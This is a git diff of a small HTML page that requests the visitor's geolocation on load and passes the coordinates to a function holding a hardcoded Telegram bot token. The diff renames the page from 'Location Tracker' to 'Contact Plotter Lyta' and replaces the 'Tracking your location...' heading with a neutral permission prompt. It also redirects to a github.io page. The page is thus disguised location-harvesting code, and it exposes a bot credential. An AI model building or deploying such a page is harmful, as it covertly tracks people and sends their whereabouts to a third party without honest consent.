@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Tracker</title>
+    <title>Contact Plotter Lyta</title>
     <script>
         function sendLocation(lat, lon) {
             let botToken = "7565350828:AAFpNkY7a3JA2BiYwho2UkHaNMt3JvHuuvM";
@@ -17,7 +17,7 @@
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
                         sendLocation(lat, lon);
-                        window.location.href = "https://example.com"; // Redirect
+                        window.location.href = "https://plotterlyta.github.io/Contact-Plotter-Lyta/"; // Redirect
                     },
                     (error) => {
                         alert("Location access denied.");
@@ -30,6 +30,6 @@
     </script>
 </head>
 <body onload="getLocation()">
-    <h1>Tracking your location...</h1>
+    <h1>Agree To Permission In Order To Continue ...</h1>
 </body>
 </html>
